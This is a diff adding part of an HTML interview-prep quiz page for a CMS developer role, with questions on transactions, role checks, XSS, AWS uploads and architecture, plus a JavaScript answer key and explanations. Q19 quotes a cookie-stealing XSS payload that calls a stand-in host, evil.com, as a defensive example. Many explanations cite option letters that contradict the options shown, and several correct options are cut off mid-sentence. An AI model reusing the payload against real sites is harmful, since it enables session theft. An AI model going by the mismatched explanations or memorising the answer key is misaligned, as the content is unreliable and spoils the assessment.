+      <div class="opt" onclick="pick(15,'A')"><span class="ok">A</span>Use a distributed saga pattern — publish a 'publish article' event to a message queue, have separate microservices handle each step asynchronously, and implement compensation events if any step fails</div>
+      <div class="opt" onclick="pick(15,'B')"><span class="ok">B</span>Use PostgreSQL stored procedures — stored procedures run all steps inside the database engine where crashes cannot interrupt them, providing automatic atomicity without application-level transaction management</div>
+      <div class="opt" onclick="pick(15,'C')"><span class="ok">C</span>Run the three UPDATE/INSERT statements sequentially with separate await calls — if any fails, catch the error and manually run compensating queries to reverse the completed steps</div>
+      <div class="opt" onclick="pick(15,'D')"><span class="ok">D</span>Wrap all three operations in a PostgreSQL transaction using the pg library: BEGIN → UPDATE article → INSERT audit_log → UPDATE author count → COMMIT. If any step throws, call ROLLBACK — all three operations succeed together or none do</div>
+    </div>
+    <div class="expl" id="ex-15"></div>
+  </div>
+
+  <div class="sec"><span class="sec-pill">CMS · BBVA · Security</span><div class="sec-line"></div><span class="sec-cnt">Q16–Q20</span></div>
+  <div class="qcard" id="qc-16">
+    <div class="qmeta"><span class="qnum">Q16</span><span class="qtag">Magnolia CMS Architecture</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">You worked on the Bobcat DXP project built on Magnolia CMS. For a BBVA CMS project, what is the key architectural advantage of a headless CMS (exposing content via REST/GraphQL APIs) over a traditional coupled CMS (like classic Magnolia or WordPress)?</div>
+    <div class="opts" id="o-16">
+      <div class="opt" onclick="pick(16,'A')"><span class="ok">A</span>Headless CMS systems are faster than coupled CMS because they do not render HTML on the server — all rendering moves to the browser, which has more processing power than a server</div>
+      <div class="opt" onclick="pick(16,'B')"><span class="ok">B</span>Headless CMS provides better security than coupled CMS because the content management interface is completely separate from the public-facing website, reducing the attack surface on the editorial backend</div>
+      <div class="opt" onclick="pick(16,'C')"><span class="ok">C</span>Headless CMS systems do not require a database — content is stored in flat JSON files that are version-controlled in Git, eliminating database maintenance overhead</div>
+      <div class="opt" onclick="pick(16,'D')"><span class="ok">D</span>Headless CMS decouples content storage and editorial workflow from the presentation layer — the same content APIs can serve the BBVA web portal, mobile app, and third-party integrations simultaneously without duplicating content management.</div>
+    </div>
+    <div class="expl" id="ex-16"></div>
+  </div>
+
+  <div class="qcard" id="qc-17">
+    <div class="qmeta"><span class="qnum">Q17</span><span class="qtag">Role-Based Access CMS</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">The BBVA CMS has three roles: Content Editor (create/edit drafts), Reviewer (approve/reject drafts), Publisher (schedule and publish). An Editor must not be able to publish directly. How do you implement this at the API level rather than just hiding UI buttons?</div>
+    <div class="opts" id="o-17">
+      <div class="opt" onclick="pick(17,'A')"><span class="ok">A</span>Hash the publish endpoint URL with a secret known only to publishers — editors cannot call the endpoint if they do not know the hashed URL, providing security through obscurity</div>
+      <div class="opt" onclick="pick(17,'B')"><span class="ok">B</span>Store the user's role in a client-side cookie and check it in the React component before calling the publish API — if the role is not Publisher, the button is hidden and the API call is never made</div>
+      <div class="opt" onclick="pick(17,'C')"><span class="ok">C</span>In the Express.js route handler for POST /articles/:id/publish, add role middleware that reads req.user.role from the JWT payload and returns HTTP 403 Forbidden if the role is not Publisher — UI hiding is a UX convenience only; the API enforces the real permission</div>
+      <div class="opt" onclick="pick(17,'D')"><span class="ok">D</span>Use PostgreSQL row-level security policies — define a policy that only allows UPDATE on status='published' for database users with the publisher role, enforcing permissions at the database layer independently of the API</div>
+    </div>
+    <div class="expl" id="ex-17"></div>
+  </div>
+
+  <div class="qcard" id="qc-18">
+    <div class="qmeta"><span class="qnum">Q18</span><span class="qtag">Content Versioning</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">The BBVA CMS must keep a version history of every article change so editors can revert to any previous version. How would you implement this in PostgreSQL without duplicating the entire articles table?</div>
+    <div class="opts" id="o-18">
+      <div class="opt" onclick="pick(18,'A')"><span class="ok">A</span>Store versions in MongoDB alongside the PostgreSQL articles table — MongoDB's document model stores the full version history as an array within the article document, avoiding the need for a separate versions table</div>
+      <div class="opt" onclick="pick(18,'B')"><span class="ok">B</span>Use a single articles table with a version_number column — increment it on each save and store all versions as separate rows in the same table with a is_current boolean flag</div>
+      <div class="opt" onclick="pick(18,'C')"><span class="ok">C</span>Use PostgreSQL's built-in temporal tables feature — ALTER TABLE articles ADD PERIOD FOR SYSTEM_TIME — this automatically tracks all row changes with valid_from and valid_to timestamps</div>
+      <div class="opt" onclick="pick(18,'D')"><span class="ok">D</span>Create an article_versions table with columns: version_id, article_id (FK), version_number, content (JSONB for the full snapshot), changed_by, changed_at. On each article save.</div>
+    </div>
+    <div class="expl" id="ex-18"></div>
+  </div>
+
+  <div class="qcard" id="qc-19">
+    <div class="qmeta"><span class="qnum">Q19</span><span class="qtag">Frontend Security XSS</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">The BBVA CMS allows editors to write rich text content that is rendered as HTML on the public-facing BBVA website. An editor (or a malicious actor with editor credentials) inputs <script>fetch('https://evil.com?c='+document.cookie)</script>. What prevents this from executing when the article is displayed to customers?</div>
+    <div class="opts" id="o-19">
+      <div class="opt" onclick="pick(19,'A')"><span class="ok">A</span>Render the rich text content inside a sandboxed iframe with sandbox='' — the iframe's sandbox attribute prevents any JavaScript inside it from accessing the parent document's cookies</div>
+      <div class="opt" onclick="pick(19,'B')"><span class="ok">B</span>Validate that the content field does not contain the word 'script' using a regex check — rejecting any content containing that string prevents script injection</div>
+      <div class="opt" onclick="pick(19,'C')"><span class="ok">C</span>Sanitise the HTML on the server before saving using a library like DOMPurify (in a Node.js environment: isomorphic-dompurify) — DOMPurify strips script tags and dangerous attributes (onclick.</div>
+      <div class="opt" onclick="pick(19,'D')"><span class="ok">D</span>Escape all HTML before storing in the database — convert < to &lt; and > to &gt; so the script tag is stored as plain text and rendered as visible characters, not executed</div>
+    </div>
+    <div class="expl" id="ex-19"></div>
+  </div>
+
+  <div class="qcard" id="qc-20">
+    <div class="qmeta"><span class="qnum">Q20</span><span class="qtag">AWS Lambda CMS</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">In your Bobcat DXP you implemented serverless architecture using AWS SAM and Lambda. For a BBVA CMS image upload feature where editors upload large files (up to 50MB), why is AWS Lambda not ideal as the upload handler, and what is the better architecture?</div>
+    <div class="opts" id="o-20">
+      <div class="opt" onclick="pick(20,'A')"><span class="ok">A</span>Lambda has a 6MB request payload limit — a 50MB file cannot be sent through Lambda. Better architecture: generate a pre-signed S3 URL on the server (a quick Lambda call), return it to the frontend.</div>
+      <div class="opt" onclick="pick(20,'B')"><span class="ok">B</span>Lambda is not ideal because image processing (resizing, compression) would exceed Lambda's 15-minute timeout for large files — use an EC2 instance for image upload and processing instead</div>
+      <div class="opt" onclick="pick(20,'C')"><span class="ok">C</span>Lambda is not ideal because it does not support binary file uploads — Lambda only processes JSON request bodies and cannot handle multipart/form-data</div>
+      <div class="opt" onclick="pick(20,'D')"><span class="ok">D</span>Lambda cold starts add 2-3 seconds to the first upload request — for a CMS where editors upload frequently, an always-on EC2 server provides consistent low-latency upload responses</div>
+    </div>
+    <div class="expl" id="ex-20"></div>
+  </div>
+
+  <div class="sec"><span class="sec-pill">System Design · Production · AWS</span><div class="sec-line"></div><span class="sec-cnt">Q21–Q25</span></div>
+  <div class="qcard" id="qc-21">
+    <div class="qmeta"><span class="qnum">Q21</span><span class="qtag">Microservices Design</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">In your Bobcat DXP you built microservices for a multi-portal DXP. For a BBVA CMS, a content service and an analytics service both need to know when an article is published. How do you notify both services without tight coupling between them?</div>
+    <div class="opts" id="o-21">
+      <div class="opt" onclick="pick(21,'A')"><span class="ok">A</span>Use a shared PostgreSQL database table as a message queue — insert a row on publish, both services poll the table every 30 seconds to detect new publications and process them</div>
+      <div class="opt" onclick="pick(21,'B')"><span class="ok">B</span>Create a dedicated notification service that the CMS calls on publish — the notification service maintains a list of subscribers and calls each one; this centralises notification logic without direct coupling between services</div>
+      <div class="opt" onclick="pick(21,'C')"><span class="ok">C</span>The CMS service directly calls both services' APIs synchronously on article publish — call content service first, then analytics service, and return success only if both acknowledge</div>
+      <div class="opt" onclick="pick(21,'D')"><span class="ok">D</span>Use an event-driven pattern: on article publish, emit an ArticlePublished event to a message broker (AWS SNS/SQS, Kafka, or RabbitMQ). Both the content service and analytics service subscribe to that event independently — the CMS service doesn't know or care which services consume the event</div>
+    </div>
+    <div class="expl" id="ex-21"></div>
+  </div>
+
+  <div class="qcard" id="qc-22">
+    <div class="qmeta"><span class="qnum">Q22</span><span class="qtag">API Caching Strategy</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">Your BBVA CMS public-facing API serves financial product data that changes daily. 10,000 users hit the same /api/products/mortgage endpoint repeatedly. How do you reduce load without serving stale financial data for more than 1 hour?</div>
+    <div class="opts" id="o-22">
+      <div class="opt" onclick="pick(22,'A')"><span class="ok">A</span>Cache the response in Redis with a 1-hour TTL: on the first request, fetch from the database, store in Redis with TTL 3600s, and return. Subsequent requests within the hour are served from Redis.</div>
+      <div class="opt" onclick="pick(22,'B')"><span class="ok">B</span>Use database query caching by enabling PostgreSQL's shared_buffers and work_mem — PostgreSQL caches frequent query results in memory, reducing query execution time without any application-level cache layer</div>
+      <div class="opt" onclick="pick(22,'C')"><span class="ok">C</span>Set Cache-Control: no-cache on all API responses — this ensures every request hits the server, providing always-fresh data without any caching risk</div>
+      <div class="opt" onclick="pick(22,'D')"><span class="ok">D</span>Set Cache-Control: public, max-age=3600 on the API response — browsers and CDN edge nodes cache the response for 1 hour, reducing requests to the origin server without any server-side cache infrastructure</div>
+    </div>
+    <div class="expl" id="ex-22"></div>
+  </div>
+
+  <div class="qcard" id="qc-23">
+    <div class="qmeta"><span class="qnum">Q23</span><span class="qtag">Docker Containerization</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">You listed Docker in your skills and deployed on AWS EC2 and Lambda. For deploying a BBVA CMS consisting of a Node.js API, a React frontend (build served by Nginx), and a PostgreSQL database in a development environment, what Docker configuration manages all three?</div>
+    <div class="opts" id="o-23">
+      <div class="opt" onclick="pick(23,'A')"><span class="ok">A</span>Use Docker Swarm with one node per service — Swarm is the Docker-native orchestration tool required for multi-container applications; Docker Compose is only for single-container setups</div>
+      <div class="opt" onclick="pick(23,'B')"><span class="ok">B</span>Containerise only the Node.js API and the Nginx/React build; run PostgreSQL on the host machine and connect using host.docker.internal — databases should never be containerised due to I/O performance degradation</div>
+      <div class="opt" onclick="pick(23,'C')"><span class="ok">C</span>Use Docker Compose with three services in docker-compose.yml: a Node.js API service, an Nginx service serving the React build, and a PostgreSQL service. Inter-container networking uses service names as hostnames (the API connects to postgres://postgres:5432); volumes persist DB data across container restarts</div>
+      <div class="opt" onclick="pick(23,'D')"><span class="ok">D</span>Build one Docker image containing all three services — running a single container simplifies the development setup and avoids networking complexity between separate containers</div>
+    </div>
+    <div class="expl" id="ex-23"></div>
+  </div>
+
+  <div class="qcard" id="qc-24">
+    <div class="qmeta"><span class="qnum">Q24</span><span class="qtag">Performance Monitoring</span><span class="qdiff dm">Medium</span></div>
+    <div class="qtext">After deploying the BBVA CMS API to AWS, some editor actions intermittently take 15+ seconds. You have no visibility into which endpoint is slow or why. What is the minimal observability setup that would diagnose this?</div>
+    <div class="opts" id="o-24">
+      <div class="opt" onclick="pick(24,'A')"><span class="ok">A</span>Implement structured request logging middleware (Morgan or a custom middleware logging method, path, status, and duration in JSON), add AWS CloudWatch for log aggregation and alerting.</div>
+      <div class="opt" onclick="pick(24,'B')"><span class="ok">B</span>Add console.log(Date.now()) at the start and end of every route handler — subtract start from end in the response to log duration, and read EC2 system logs to find the slow requests</div>
+      <div class="opt" onclick="pick(24,'C')"><span class="ok">C</span>Use React DevTools Profiler — it identifies which React component renders are slow and pinpoints frontend-side performance issues causing the perceived slowness</div>
+      <div class="opt" onclick="pick(24,'D')"><span class="ok">D</span>Enable PostgreSQL's log_min_duration_statement = 1000 to log queries slower than 1 second — if slow queries are the cause, the PostgreSQL logs will show the problematic queries without any application changes</div>
+    </div>
+    <div class="expl" id="ex-24"></div>
+  </div>
+
+  <div class="qcard" id="qc-25">
+    <div class="qmeta"><span class="qnum">Q25</span><span class="qtag">BBVA Full-Stack Architecture</span><span class="qdiff dh">Hard</span></div>
+    <div class="qtext">Design the high-level component architecture for a BBVA financial product CMS where: (1) editors manage product content in a CMS admin, (2) the public BBVA website shows products via a Next.js frontend, (3) product rate changes must be live within 10 minutes, and (4) all editorial actions must be audit-logged. Name the four key components and their connections.</div>
+    <div class="opts" id="o-25">
+      <div class="opt" onclick="pick(25,'A')"><span class="ok">A</span>WordPress CMS → MySQL database → PHP API → React frontend. WordPress has built-in editorial workflow, audit logging via plugins, and MySQL handles financial product data natively</div>
+      <div class="opt" onclick="pick(25,'B')"><span class="ok">B</span>(1) Google Sheets as the CMS — editors fill in product data, (2) a Zapier automation syncs changes to a REST API, (3) the REST API serves a React SPA, (4) Google Analytics tracks all editorial actions as events for audit purposes</div>
+      <div class="opt" onclick="pick(25,'C')"><span class="ok">C</span>(1) Headless CMS admin (Strapi/Payload) with PostgreSQL — editors manage content, audit log table records every change with user/timestamp. (2) Node.js/Express API layer — validates, caches in Redis, serves content to frontend.</div>
+      <div class="opt" onclick="pick(25,'D')"><span class="ok">D</span>(1) A single monolithic Node.js application combining CMS admin, API, and frontend rendering. (2) PostgreSQL for all data. (3) Cron job running every 10 minutes to refresh product rates. (4) Application-level logging to a flat file for audit trail</div>
+    </div>
+    <div class="expl" id="ex-25"></div>
+  </div>
+
+
+  <div class="results" id="resultsPanel">
+    <div class="rtitle">Assessment <span>Complete</span></div>
+    <div class="rsub" id="rSub"></div>
+    <div class="sgrid">
+      <div class="sbox bc"><div class="sv" id="rScore">—</div><div class="sl">Score</div></div>
+      <div class="sbox gc"><div class="sv" id="rPct">—</div><div class="sl">Accuracy</div></div>
+      <div class="sbox ac"><div class="sv" id="rTime">—</div><div class="sl">Time</div></div>
+      <div class="sbox rc"><div class="sv" id="rWrong">—</div><div class="sl">Incorrect</div></div>
+    </div>
+    <div class="verdict" id="verdBox"></div>
+    <div class="sb-head">Score by section</div>
+    <div id="secBD"></div>
+  </div>
+</main>
+
+<div class="fbar">
+  <div class="fstats">
+    <span>ANSWERED <span id="fA">0</span>/25</span>
+    <span>CORRECT <span id="fC">0</span></span>
+    <span class="ft" id="fT">35:00</span>
+  </div>
+  <button class="btn-sub" onclick="submitAll()">SUBMIT &rarr; RESULTS</button>
+</div>
+
+<script>
+const ANS={1:'A',2:'D',3:'B',4:'B',5:'C',6:'D',7:'B',8:'C',9:'C',10:'C',11:'B',12:'A',13:'B',14:'D',15:'D',16:'D',17:'C',18:'D',19:'C',20:'A',21:'D',22:'A',23:'C',24:'A',25:'C'};
+const EX={1:`React.memo is the correct answer for preventing child re-renders when props haven't changed. It wraps the component and performs shallow prop comparison — if all props are equal by reference, the render is skipped. useMemo (C) memoises a computed value inside a component but does not prevent the component itself from re-rendering. useCallback (A) prevents new function references on each render (which is complementary to React.memo — without it, a function prop always looks changed).`,2:`Lifting state to the nearest common ancestor is the foundational React data flow pattern. When the ancestor is far up the tree and prop drilling through 5+ intermediate components becomes painful, React Context provides a cleaner channel — create a Context, wrap the subtree in a Provider, and any descendant can consume via useContext without props threading through intermediaries. This is the correct tool before reaching for Redux.`,3:`Generic type parameters are the correct TypeScript solution for reusable typed utilities. fetchData<T>(url: string): Promise<T> lets the caller specify the expected response type — fetchData<User[]>('/api/users') returns Promise<User[]> with full type safety. Using any (A) defeats TypeScript's purpose. Union returns (C) require the caller to narrow the type manually after every call. Overloads (D) work but are verbose and require updating for every new entity type.`,4:`Different pages have different freshness requirements. The financial product page (daily rate changes) needs SSR (getServerSideProps) — data is fetched server-side on every request, guaranteeing the latest rates. ISR with 60s revalidate (C) still serves stale data for up to 60 seconds — unacceptable for financial rates. The marketing landing page (monthly updates, high traffic) is the ideal ISR/SSG use case: serve from CDN cache with fast TTFB, background revalidation handles the occasional update.`,5:`React Hook Form is the standard for complex forms. It uses uncontrolled inputs under the hood (registers each input with a ref) but exposes a clean controlled-like API — zero re-renders on each keystroke (unlike useState for every field), built-in validation rules, async validator support, and error state management. For 15+ fields with async server validation (e.g. checking if a product code already exists), managing this with useState (A, D) requires significant boilerplate and has poor performance.`,6:`A shared internal component library is the standard pattern for multi-team design consistency. Published as an npm package (via private registry or monorepo workspace), each micro-frontend installs and imports the components. Semantic versioning lets teams upgrade on their own schedule. This is the architecture behind design systems like Atlassian's Atlaskit, Shopify's Polaris, and BBVA's own design system. Shared CSS (C) handles styles but not behaviour/accessibility/state logic that components encapsulate.`,7:`Node.js is single-threaded — synchronous CPU-bound operations (like bcrypt.hashSync with 10+ rounds) block the event loop. While the CPU is busy hashing, no callbacks, I/O events, or other requests can be processed. bcrypt.hash() (async) uses libuv's thread pool (4 threads by default) to run the hashing off the main thread, returning control to the event loop immediately. Under 50 concurrent requests: sync = sequential processing; async = up to 4 concurrent hash operations while the event loop handles everything else.`,8:`POST to an action endpoint (POST /articles/publish or POST /publish) is the accepted REST pattern for batch operations that trigger a state transition. The body carries the array of IDs and any transition parameters. REST doesn't mandate one-URL-per-resource for every operation — bulk/batch endpoints are a pragmatic necessity. PATCH per article (D) creates multiple round trips and atomicity problems. PUT on the collection (B) semantically replaces all articles. GET for state-changing operations (C) violates HTTP semantics (GET must be safe and idempotent).`,9:`Middleware order matters because each middleware calls next() to continue or terminates the chain. For BBVA audit requirements: log first to capture every request attempt including auth failures (regulatory compliance requires a complete audit trail). Auth second — reject unauthorised requests before schema validation to avoid revealing schema details to unauthenticated callers. Schema validation last — only validate the body of authenticated, logged requests. Express processes middleware strictly in registration order — there is no automatic reordering (D).`,10:`Both patterns are genuinely production-valid with real trade-offs. Immediate revocation (A) is required when instant role changes are a compliance requirement — one DB/Redis lookup per request adds ~1-2ms latency but provides synchronous enforcement. Short-lived tokens (B) are the stateless JWT pattern — no per-request DB lookup, but a downgraded editor can still publish for up to 15 minutes. For BBVA's regulated environment, the compliance requirement determines the choice: financial roles (admin access to rate data) likely warrant immediate revocation; editorial roles may accept 15-minute lag.`,11:`Promise.all is the correct pattern for concurrent independent async operations. Sequential await (await fetch1(); await fetch2(); await fetch3()) processes them one at a time — each waits for the previous to complete. Promise.all fires all three simultaneously and resolves when all three complete, so total time = max(1s, 1s, 1s) = 1s instead of 3s. for...of with await (C) is sequential — the loop awaits each call before the next iteration. Node.js handles concurrent network I/O on one thread via libuv's async I/O — no separate Lambda needed.`,12:`The compound index with equality fields first, range field last is the PostgreSQL optimisation pattern (analogous to MongoDB's ESR rule). (author_id, status, created_at) lets PostgreSQL: (1) use the index for the equality conditions on author_id and status to narrow the result set drastically, (2) then apply the range condition on created_at within that already-narrow set. A single-column index on status (B) matches many rows (all published articles), leaving 2M × published% to scan for the other conditions. Full-text index (A) is for text search, not equality.`,13:`PostgreSQL with JSONB is the hybrid answer: fixed fields get typed columns with NOT NULL constraints, foreign keys, and B-tree indexes (fast, safe, relational). Custom/variable fields go into a JSONB column — queryable with the @> operator, indexable with a GIN index, and flexible without schema migrations. MongoDB (A) gives schema flexibility but loses referential integrity, ACID transactions, and strong typing on the known fields. EAV (C) is a recognised antipattern — complex queries, poor performance. Dual databases (D) creates distributed transaction problems.`,14:`Cache-aside (lazy loading) is the standard read-through pattern: GET → cache miss → fetch from source → SET with TTL → return. Redis SET with EX (or SETEX) sets the value and TTL atomically. RPUSH/LRANGE (A) is for queue/list data structures, not caching. HSET (C) is a valid alternative for grouping related keys but is not more appropriate than separate string keys for API response caching. SETEX on every invocation (D) would overwrite cached values on every cold start, defeating the cache purpose.`,15:`PostgreSQL transactions are the correct tool for multi-statement atomicity within one database. Using pg: const client = await pool.connect(); try { await client.query('BEGIN'); await client.query(updateArticle); await client.query(insertAudit); await client.query(updateCount); await client.query('COMMIT'); } catch { await client.query('ROLLBACK'); throw e; } finally { client.release(); }. Compensating queries (A) are not atomic — the compensation can also fail. Stored procedures (C) are transactional but still require BEGIN/COMMIT or atomic blocks. Saga (D) is for distributed systems with multiple databases.`,16:`The defining advantage of headless CMS is decoupling content from presentation — enabling omnichannel delivery. BBVA's content editors work in the CMS admin interface (Strapi, Contentful, Sanity, or Payload CMS); the content is served via APIs to the Next.js web portal, a React Native mobile app, and potentially to a chatbot or third-party integrations. All channels share one source of truth without duplicating the content management workflow. The security benefit (D) is a secondary advantage, not the primary architectural value.`,17:`API-level role enforcement is the correct security architecture. Frontend role checks (A) are trivially bypassed — any authenticated user can call the API directly with curl or Postman. The backend must enforce: const requireRole = (roles) => (req, res, next) => roles.includes(req.user.role) ? next() : res.status(403).json({error:'Forbidden'}). Apply app.post('/articles/:id/publish', requireRole(['Publisher']), publishHandler). Row-level security (C) is a valid defence-in-depth layer but adds complexity and requires matching DB users to application roles. Security through obscurity (D) is not security.`,18:`A dedicated article_versions table is the standard CMS versioning pattern. The articles table holds the current live state; article_versions holds a complete snapshot (content as JSONB) per change with metadata (who changed it, when, why). Restoring a version = SELECT content FROM article_versions WHERE article_id=? ORDER BY version_number DESC LIMIT 1, then UPDATE articles SET content=? . PostgreSQL does not have built-in temporal tables in the SQL:2011 sense (C) — that's a feature of SQL Server and MariaDB. MongoDB alongside PostgreSQL (D) creates distributed consistency problems.`,19:`DOMPurify is the industry-standard HTML sanitisation library for rich text. It parses the HTML into a DOM, removes dangerous elements and attributes (script, iframe, on* event handlers), and returns clean HTML safe for rendering. Escaping all HTML (A) breaks rich text — you cannot bold text or add links if < and > are escaped. Script-keyword regex (C) is trivially bypassed (<scr<script>ipt>, unicode encoding). Sandboxed iframe (D) is a defence-in-depth measure but not the primary prevention layer. CSP headers complement sanitisation but don't replace it.`,20:`Lambda's 6MB payload limit (synchronous invocations via API Gateway) is the hard constraint for file uploads. The pre-signed S3 URL pattern is the correct serverless architecture: Lambda generates a time-limited signed URL for a specific S3 key (valid for 15 minutes) and returns it to the client. The client uses this URL to PUT the file directly to S3 — bypassing Lambda entirely for the binary transfer. S3 triggers a Lambda for post-processing (thumbnail generation, virus scan) after the upload completes. This is the standard AWS serverless file upload pattern.`,21:`Event-driven messaging decouples producers from consumers. The CMS emits ArticlePublished to a message broker and continues — it has no knowledge of who consumes the event. Adding a third subscriber (an email service, a CDN invalidation service) requires zero changes to the CMS. Synchronous direct calls (A) couple the CMS to both services — if analytics is down, publish fails. Shared DB polling (C) creates a polling antipattern with database contention. A notification service (D) reduces coupling but still requires the CMS to call one service synchronously.`,22:`Redis with explicit TTL and cache invalidation is the correct server-side caching pattern for financial data with a known update cadence. The pattern: check Redis → miss → query DB → cache in Redis with TTL=3600 → return. On daily updates: DEL the Redis key so the next request repopulates from fresh DB data. HTTP Cache-Control (C) is a valid complementary layer but you lose invalidation control — you cannot force CDN/browser caches to refresh when rates change mid-day. PostgreSQL buffer cache (D) speeds queries but doesn't eliminate N×10K queries per hour to the DB.`,23:`Docker Compose is the standard tool for multi-container development environments. A docker-compose.yml defines three services: api (Node.js), frontend (Nginx serving the React static build), and db (postgres:15). Inter-service communication uses container names as DNS (api connects to postgres://db:5432). Named volumes persist database data. One command (docker compose up) starts the entire stack. Single-image multi-service (A) violates separation of concerns and makes scaling impossible. Docker Swarm (C) is for production multi-node clustering, not local dev. Databases can be containerised in development (D is an ops concern, not a blanket rule).`,24:`The full observability stack: structured logging (JSON with timestamps, duration, user ID, route — not console.log) makes logs searchable. CloudWatch aggregates logs across instances and enables metric-based alerts (p95 latency > 5s → alert). X-Ray traces the full request path: Node.js route handler → database query → external API call → response, identifying exactly where the 15s goes. React DevTools (C) diagnoses client-side rendering performance, not API latency. PostgreSQL query logging (D) identifies DB-side slowness but misses application-layer or external-API bottlenecks.`,25:`This architecture maps precisely to the requirements. Payload/Strapi with PostgreSQL provides the editorial workflow, role-based access, and audit table. The Express API layer adds Redis caching and business logic between CMS and frontend. Next.js ISR with revalidate:600 serves cached pages (fast TTFB) but the webhook is the key: when an editor publishes a rate change, the CMS calls Next.js's revalidation API (res.revalidatePath('/products/mortgage')) — the page regenerates in seconds, not waiting for the 10-minute ISR window. The 10-minute ISR is the safety net; the webhook is the primary update mechanism.`};
+const SECS=[{name:`React.js · TypeScript · Frontend`,qs:[1,2,3,4,5,6]},{name:`Node.js · Express · APIs`,qs:[7,8,9,10,11]},{name:`PostgreSQL · MongoDB · Redis`,qs:[12,13,14,15]},{name:`CMS · BBVA · Security`,qs:[16,17,18,19,20]},{name:`System Design · Production · AWS`,qs:[21,22,23,24,25]}];
+let secs=2100,usedSecs=0,tInt=null,tStarted=false,submitted=false;
+const picks={},locked={};let corr=0,ansTotal=0;
+function startTimer(){if(tStarted)return;tStarted=true;tInt=setInterval(()=>{secs--;usedSecs++;const m=String(Math.floor(secs/60)).padStart(2,'0'),s=String(secs%60).padStart(2,'0'),d=m+':'+s;document.getElementById('tmrDisp').textContent=d;document.getElementById('fT').textContent=d;document.getElementById('tmrDisp').className='tmr'+(secs<300?' urgent':'');if(secs<=0){clearInterval(tInt);submitAll(true);}},1000);}
+document.addEventListener('click',startTimer,{once:true});
+document.addEventListener('keydown',startTimer,{once:true});
+function pick(n,choice){
+  if(locked[n]||submitted)return;locked[n]=true;picks[n]=choice;ansTotal++;
+  const correct=ANS[n],isOk=choice===correct;if(isOk)corr++;
+  const opts=document.querySelectorAll('#o-'+n+' .opt');
+  ['A','B','C','D'].forEach((k,i)=>{opts[i].classList.add('locked');if(k===choice&&isOk)opts[i].classList.add('correct-pick');if(k===choice&&!isOk)opts[i].classList.add('wrong-pick');if(k===correct&&!isOk)opts[i].classList.add('reveal-right');});
+  document.getElementById('qc-'+n).classList.add(isOk?'answered':'incorrect');
+  const ex=document.getElementById('ex-'+n);
+  ex.innerHTML='<strong>'+(isOk?'&#10003; Correct':'&#10007; Incorrect &mdash; Correct: '+correct)+'</strong> &mdash; '+EX[n];
+  ex.className='expl show '+(isOk?'expl-ok':'expl-bad');
+  document.getElementById('fA').textContent=ansTotal;document.getElementById('fC').textContent=corr;
+  document.getElementById('progF').style.width=(ansTotal/25*100)+'%';
+  if(ansTotal===25&&!submitted)setTimeout(()=>submitAll(),500);
+}
+function submitAll(auto=false){
+  if(submitted)return;submitted=true;clearInterval(tInt);usedSecs=2100-secs;
+  const panel=document.getElementById('resultsPanel');panel.classList.add('show');
+  document.getElementById('rScore').textContent=corr+'/25';
+  document.getElementById('rPct').textContent=Math.round(corr/25*100)+'%';
+  document.getElementById('rWrong').textContent=ansTotal-corr;
+  const um=String(Math.floor(usedSecs/60)).padStart(2,'0'),us=String(usedSecs%60).padStart(2,'0');
+  document.getElementById('rTime').textContent=um+':'+us;
+  const pct=corr/25*100,vb=document.getElementById('verdBox');
+  if(pct>=80){vb.className='verdict v-ex';vb.textContent='&#9889; Excellent — Strong full-stack depth across React, Node.js, PostgreSQL, AWS, and CMS/BBVA production patterns. Clear hire signal for the role.';}
+  else if(pct>=65){vb.className='verdict v-good';vb.textContent='&#10003; Good — Solid 4-year production experience shows. Review the sections where marks dropped — especially PostgreSQL optimisation, CMS security, or microservices event patterns.';}
+  else if(pct>=50){vb.className='verdict v-ok';vb.textContent='&#9675; Developing — Core MERN knowledge is present. Study PostgreSQL transactions and indexing, Express middleware ordering, JWT role enforcement, and AWS Lambda constraints before the technical interview.';}
+  else{vb.className='verdict v-try';vb.textContent='&#8635; Needs Preparation — Review React.memo vs useMemo, Node.js event loop blocking, Promise.all for concurrency, PostgreSQL compound indexes, and XSS prevention for the CMS context.';}
+  document.getElementById('rSub').textContent=ansTotal+' of 25 answered &#xB7; '+corr+' correct &#xB7; '+(ansTotal-corr)+' incorrect';
+  const bd=document.getElementById('secBD');
+  bd.innerHTML=SECS.map(s=>{const got=s.qs.filter(q=>picks[q]===ANS[q]).length,p=Math.round(got/s.qs.length*100),c=p>=80?'#3B82F6':p>=60?'#22C55E':p>=40?'#F59E0B':'#EF4444';return '<div class="sb-row"><div class="sb-name">'+s.name+'</div><div class="sb-track"><div class="sb-fill" style="width:'+p+'%;background:'+c+'"></div></div><div class="sb-num">'+got+'/'+s.qs.length+'</div></div>';}).join('');
+  panel.scrollIntoView({behavior:'smooth',block:'start'});
+}
+</script>
+</body>
+</html>
